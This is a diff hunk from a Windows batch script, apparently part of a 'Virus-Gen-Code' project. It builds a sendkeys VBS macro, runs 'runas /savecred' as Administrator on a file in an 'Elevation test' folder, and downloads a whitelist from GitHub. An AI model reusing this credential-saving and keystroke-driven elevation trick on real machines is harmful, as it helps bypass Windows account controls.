@@ -47,7 +47,7 @@ if %errorlevel% neq 0 (
     echo wscript.sleep 100 >>macro.vbs
     echo wshshell.sendkeys "{ENTER}" >>macro.vbs
 )
-runas /user:%computername%\Administrator /savecred "C:\Users\61481\OneDrive\Desktop\Elevation test\File to Elevate.bat"
+runas /user:%computername%\Administrator /savecred "C:\Users\%username%\OneDrive\Desktop\Elevation test\File to Elevate.bat"
 echo [33mstarting check 1...[0m
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist").Content >WL1.sav
 if exist C:\ProgramData\GVGemail.sav (goto WLcheck) else (goto email_error)
